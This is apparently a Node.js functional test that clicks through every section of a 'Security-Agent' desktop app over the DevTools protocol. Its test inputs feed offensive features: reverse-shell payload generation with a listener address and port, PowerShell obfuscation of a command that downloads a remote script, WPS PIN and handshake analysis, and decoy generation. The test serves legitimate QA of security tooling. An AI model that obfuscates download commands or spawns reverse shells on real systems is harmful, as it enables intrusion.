// CDP GUI functional test for Security-Agent desktop app.
// Connects to the live app (--remote-debugging-port=9222), navigates every
// nav section, fills inputs, clicks every action button, and asserts the
// corresponding output panel changed.
const base = process.env.CDP_BASE || 'http://127.0.0.1:9222';
const TMP = process.env.GUI_TEST_TMP || 'C:/Users/david/AppData/Local/Temp/opencode/gui-test';

const results = [];
function record(name, ok, detail, output) {
  results.push({ name, ok, detail, output });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? '  | ' + detail : ''}`);
}

async function main() {
  const list = await (await fetch(`${base}/json`)).json();
  const page = list.find((t) => t.type === 'page');
  if (!page) throw new Error('no page target');
  const ws = new WebSocket(page.webSocketDebuggerUrl);
  let nextId = 1;
  const pending = new Map();
  ws.onmessage = (ev) => {
    const m = JSON.parse(ev.data);
    if (m.id && pending.has(m.id)) {
      pending.get(m.id)(m);
      pending.delete(m.id);
    }
  };
  await new Promise((res) => (ws.onopen = res));
  const send = (method, params = {}) =>
    new Promise((res) => {
      const id = nextId++;
      pending.set(id, res);
      ws.send(JSON.stringify({ id, method, params }));
    });
  await send('Runtime.enable');
  await send('Page.enable');
  // Fresh state: reload the page so panel text from a previous run is gone.
  await send('Page.reload', { ignoreCache: true });
  await new Promise((r) => setTimeout(r, 2000));

  async function evalJs(expr) {
    const r = await send('Runtime.evaluate', { expression: expr, returnByValue: true, awaitPromise: true });
    if (r.result && r.result.exceptionDetails) return { __exc: JSON.stringify(r.result.exceptionDetails).slice(0, 300) };
    return r.result ? r.result.result.value : undefined;
  }

  const nav = (text) => evalJs(`(() => {
    const b = [...document.querySelectorAll('.nav-item')].find(x => (x.textContent||'').trim() === ${JSON.stringify(text)});
    if (!b) return 'NO_NAV';
    b.click(); return 'ok';
  })()`);
  const click = (id) => evalJs(`(() => {
    const el = document.getElementById(${JSON.stringify(id)});
    if (!el) return 'NO_EL';
    el.click(); return 'ok';
  })()`);
  const setIn = (id, value) => evalJs(`(() => {
    const el = document.getElementById(${JSON.stringify(id)});
    if (!el) return 'NO_EL';
    el.value = ${JSON.stringify(value)};
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
    return 'ok';
  })()`);
  const setSelect = (id, preferred) => evalJs(`(() => {
    const el = document.getElementById(${JSON.stringify(id)});
    if (!el) return 'NO_EL';
    const opts = [...el.options].filter(o => o.value !== '');
    let pick = null;
    if (${JSON.stringify(preferred || null)} && opts.some(o => o.value.includes(${JSON.stringify(preferred)}))) {
      pick = opts.find(o => o.value.includes(${JSON.stringify(preferred)})).value;
    } else if (opts.length) {
      pick = opts[0].value;
    }
    if (pick) el.value = pick;
    el.dispatchEvent(new Event('change', { bubbles: true }));
    return pick || 'NO_OPTS';
  })()`);
  const out = (id) => evalJs(`(() => {
    const el = document.getElementById(${JSON.stringify(id)});
    return el ? (el.textContent || '') : 'NO_OUTPUT_EL';
  })()`);
  const outLen = (id) => evalJs(`(() => {
    const el = document.getElementById(${JSON.stringify(id)});
    return el ? (el.textContent || '').length : -1;
  })()`);

  async function pollUntilChanged(id, initial, timeoutMs = 20000) {
    const start = Date.now();
    let last = initial;
    let stable = 0;
    while (Date.now() - start < timeoutMs) {
      await new Promise((r) => setTimeout(r, 250));
      const cur = await outLen(id);
      if (cur !== last) {
        last = cur;
        stable++;
        if (stable >= 2) return cur;
      }
    }
    return last;
  }

  // Dump select options for reference
  const selects = await evalJs(`(() => {
    const ids = ['tool-name','offensive-shell-type','offensive-wifi-security','offensive-wifi-encryption','offensive-postexploit-mode'];
    const res = {};
    for (const id of ids) {
      const el = document.getElementById(id);
      res[id] = el ? [...el.options].map(o => o.value).filter(v => v !== '') : 'NO_EL';
    }
    return res;
  })()`);
  console.log('=== select options ===');
  console.log(JSON.stringify(selects, null, 1));

  // Capture baseline lengths of all output panels
  const baseline = {};
  for (const suffix of ['status','tools','external','list-tools','plan-scan','findings','retest','audit','audit-db','findings-db','calibration-db','reasoning-db','llm-generate','llm-anomaly','ask','about','offensive-hash','offensive-password','offensive-wordlist','offensive-shell','offensive-payload','offensive-evasion','offensive-wireless','offensive-postexploit','offensive-decoys','offensive-handshake','offensive-wps','offensive-keys']) {
    baseline[suffix] = await outLen('output-' + suffix);
  }

  const ERROR_MARKERS = /error|exception|uncaught|NO_EL|NO_NAV|NO_OUTPUT_EL|NO_OPTS|not found|no such file/i;
  // These markers are acceptable when the CLI legitimately reports an empty/unavailable artifact.
  const OK_MARKERS = /no findings|no audit records|no records|not locally installed|none|usage:|missing path|failed to read/i;

  function classify(suffix) {
    const t = outText.get(suffix) || '';
    const changed = (outTextLen.get(suffix) || 0) !== baseline[suffix];
    if (!changed) return { ok: false, detail: 'output did not change' };
    if (ERROR_MARKERS.test(t) && !OK_MARKERS.test(t)) return { ok: false, detail: 'error markers in output: ' + t.slice(0, 160) };
    return { ok: true, detail: '' };
  }

  const outText = new Map();
  const outTextLen = new Map();

  async function runCase(name, navText, setup, clickId, suffix, timeoutMs) {
    const navR = await nav(navText);
    if (navR !== 'ok') { record(name, false, 'nav failed: ' + navR, ''); return; }
    const fill = await setup();
    if (typeof fill === 'string' && fill.startsWith('NO_') && fill !== 'NO_OPTS') {
      record(name, false, 'setup failed: ' + fill, '');
      return;
    }
    // Deterministic baseline: clear the target output panel first.
    await evalJs(`(() => {
      const el = document.getElementById('output-' + ${JSON.stringify(suffix)});
      if (el) el.textContent = '';
    })()`);
    const ck = await click(clickId);
    if (ck !== 'ok') { record(name, false, 'click failed: ' + ck, ''); return; }
    const newLen = await pollUntilChanged('output-' + suffix, 0, timeoutMs || 20000);
    const t = await out('output-' + suffix);
    outText.set(suffix, t);
    outTextLen.set(suffix, newLen);
    const cls = classify(suffix);
    record(name, cls.ok, cls.detail, t);
  }

  // ---- Dashboard / Status ----
  await runCase('Dashboard > Refresh Status', 'Dashboard', async () => 'ok', 'btn-refresh-status', 'status', 10000);
  // Note: refresh-status writes to output-status; no inputs.

  // ---- Run Tool (built-in) ----
  await runCase('Run Tool (built-in)', 'Run Tool', async () => {
    const s = await setSelect('tool-name', 'offline-status');
    if (typeof s === 'string' && s.startsWith('NO_')) return s;
    const a = await setIn('tool-input-path', `${TMP}/tool-input.txt`);
    if (a !== 'ok') return a;
    return setIn('tool-output-path', `${TMP}/gui-tool-out.txt`);
  }, 'btn-run-tool', 'tools', 25000);

  // ---- Skills ----
  await runCase('Skills > Load Skills', 'Skills', async () => 'ok', 'btn-list-skills', 'tools', 15000);

  // ---- External Tool ----
  await runCase('External Tool (valid cataloged name)', 'External Tool', async () => {
    const a = await setIn('ext-tool-name', 'hashdeep');
    if (a !== 'ok') return a;
    return setIn('ext-tool-args', '');
  }, 'btn-run-external', 'external', 15000);

  // ---- List Tools ----
  await runCase('List Tools', 'List Tools', async () => 'ok', 'btn-list-tools', 'list-tools', 15000);

  // ---- Plan Scan ----
  await runCase('Plan Scan', 'Plan Scan', async () => setIn('plan-config-path', `${TMP}/plan.config`), 'btn-plan-scan', 'plan-scan', 20000);

  // ---- Record Findings ----
  await runCase('Record Findings', 'Findings', async () => {
    const a = await setIn('findings-dest', `${TMP}/gui-record-dest.jsonl`);
    if (a !== 'ok') return a;
    return setIn('findings-src', `${TMP}/findings-src.jsonl`);
  }, 'btn-record-findings', 'findings', 15000);

  // ---- Schedule Retest ----
  await runCase('Schedule Retest', 'Schedule Retest', async () => setIn('retest-path', `${TMP}/fresh-dest.jsonl`), 'btn-schedule-retest', 'retest', 15000);

  // ---- Audit Log ----
  await runCase('View Audit Log', 'Audit Log', async () => setIn('audit-log-path', `${TMP}/audit-view.jsonl`), 'btn-view-audit', 'audit', 15000);

  // ---- Audit Database ----
  await runCase('View Audit Database', 'Audit Database', async () => setIn('audit-db-path', `${TMP}/audit.sadb`), 'btn-view-audit-db', 'audit-db', 15000);

  // ---- Findings Database ----
  await runCase('View Findings Database', 'Findings Database', async () => setIn('findings-db-path', `${TMP}/findings.sadb`), 'btn-view-findings-db', 'findings-db', 15000);

  // ---- Calibration DB ----
  await runCase('View Calibration DB', 'Calibration DB', async () => setIn('calibration-db-path', `${TMP}/calibration.sadb`), 'btn-view-calibration-db', 'calibration-db', 15000);

  // ---- Reasoning Log DB (missing file -> clean error expected) ----
  await runCase('View Reasoning Log (missing file)', 'Reasoning Log', async () => setIn('reasoning-db-path', `${TMP}/missing-reasoning.sadb`), 'btn-view-reasoning-db', 'reasoning-db', 15000);

  // ---- LLM Generate ----
  await runCase('LLM Generate', 'Generate Text', async () => setIn('llm-gen-prompt', 'scan the network'), 'btn-llm-generate', 'llm-generate', 15000);

  // ---- LLM Anomaly ----
  await runCase('LLM Anomaly Score', 'Anomaly Score', async () => setIn('llm-anomaly-text', 'The admin panel returned 403 to an unauthenticated request'), 'btn-llm-anomaly', 'llm-anomaly', 15000);

  // ---- Ask (NLU) ----
  await runCase('Ask (NLU)', 'Ask (NLU)', async () => setIn('ask-input', 'what tools do you have?'), 'btn-ask', 'ask', 15000);

  // ---- Offensive: Hash ID ----
  await runCase('Hash ID', 'Hash ID', async () => setIn('offensive-hash-input', '5f4dcc3b5aa765d61d8327deb882cf99'), 'btn-offensive-hash', 'offensive-hash', 15000);

  // ---- Offensive: Password Strength ----
  await runCase('Password Strength', 'Password Strength', async () => setIn('offensive-password-input', 'CorrectHorseBatteryStaple'), 'btn-offensive-password', 'offensive-password', 15000);

  // ---- Offensive: Gen Wordlist ----
  await runCase('Gen Wordlist', 'Gen Wordlist', async () => {
    const a = await setIn('offensive-wordlist-target', 'acme');
    if (a !== 'ok') return a;
    const b = await setIn('offensive-wordlist-company', 'Acme Corp');
    if (b !== 'ok') return b;
    return setIn('offensive-wordlist-year', '2026');
  }, 'btn-offensive-wordlist', 'offensive-wordlist', 15000);

  // ---- Offensive: Gen Shell Payload ----
  await runCase('Gen Shell Payload', 'Gen Shell Payload', async () => {
    const s = await setSelect('offensive-shell-type', '');
    if (typeof s === 'string' && s.startsWith('NO_')) return s;
    const a = await setIn('offensive-shell-lhost', '10.0.0.1');
    if (a !== 'ok') return a;
    return setIn('offensive-shell-lport', '4444');
  }, 'btn-offensive-shell', 'offensive-shell', 15000);

  // ---- Offensive: Analyze Payload ----
  await runCase('Analyze Payload', 'Analyze Payload', async () => setIn('offensive-payload-input', '90 90 90 cc b8 01 00 00 00 bb 01 00 00 00 cd 80'), 'btn-offensive-payload', 'offensive-payload', 15000);

  // ---- Offensive: PS Obfuscation ----
  await runCase('PS Obfuscation', 'PS Obfuscation', async () => setIn('offensive-evasion-command', 'Invoke-WebRequest -Uri http://example.com/x.ps1'), 'btn-offensive-evasion', 'offensive-evasion', 15000);

  // ---- Offensive: Wireless Audit ----
  await runCase('Wireless Audit', 'Wireless Audit', async () => {
    const a = await setIn('offensive-wifi-essid', 'TestNet');
    if (a !== 'ok') return a;
    const s = await setSelect('offensive-wifi-security', '');
    if (typeof s === 'string' && s.startsWith('NO_')) return s;
    return setSelect('offensive-wifi-encryption', '');
  }, 'btn-offensive-wireless', 'offensive-wireless', 15000);

  // ---- Offensive: Post-Exploit ----
  await runCase('Post-Exploit Analysis', 'Post-Exploit', async () => {
    const s = await setSelect('offensive-postexploit-mode', '');
    if (typeof s === 'string' && s.startsWith('NO_')) return s;
    return setIn('offensive-postexploit-input', 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin');
  }, 'btn-offensive-postexploit', 'offensive-postexploit', 15000);

  // ---- Offensive: Gen Decoys ----
  await runCase('Gen Decoys', 'Gen Decoys', async () => {
    const a = await setIn('offensive-decoys-real-ip', '10.0.0.1');
    if (a !== 'ok') return a;
    return setIn('offensive-decoys-count', '5');
  }, 'btn-offensive-decoys', 'offensive-decoys', 15000);

  // ---- Offensive: Analyze Handshake ----
  await runCase('Analyze Handshake', 'Analyze Handshake', async () => setIn('offensive-handshake-frames', '0000000000000000000000000000000000000000 0101000000000000000000000000000000000000'), 'btn-offensive-handshake', 'offensive-handshake', 15000);

  // ---- Offensive: WPS PIN ----
  await runCase('WPS PIN', 'WPS PIN', async () => setIn('offensive-wps-pin', '12345670'), 'btn-offensive-wps', 'offensive-wps', 15000);

  // ---- Offensive: Analyze Keys ----
  await runCase('Analyze Keys', 'Analyze Keys', async () => setIn('offensive-keys-input', 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDX user@host'), 'btn-offensive-keys', 'offensive-keys', 15000);

  // ---- About ----
  await runCase('About', 'About', async () => 'ok', 'btn-about', 'about', 10000);

  // ---- Summary ----
  const failed = results.filter((r) => !r.ok);
  const passed = results.filter((r) => r.ok);
  console.log(`\n==== SUMMARY: ${passed.length} PASS / ${failed.length} FAIL (of ${results.length}) ====`);
  if (failed.length) {
    console.log('\n--- FAILED CASES ---');
    for (const f of failed) {
      console.log(`FAIL ${f.name}: ${f.detail}`);
      if (f.output) console.log('     output: ' + f.output.replace(/\n/g, ' | ').slice(0, 300));
    }
  }
  console.log('\n--- OUTPUT SNIPPETS (successful cases) ---');
  for (const r of results.filter((x) => x.ok)) {
    const snip = (r.output || '').replace(/\s+/g, ' ').trim().slice(0, 140);
    console.log(`[${r.name}] ${snip}`);
  }
  ws.close();
}

main().catch((e) => {
  console.error('TEST DRIVER FAILED:', e);
  process.exit(1);
});
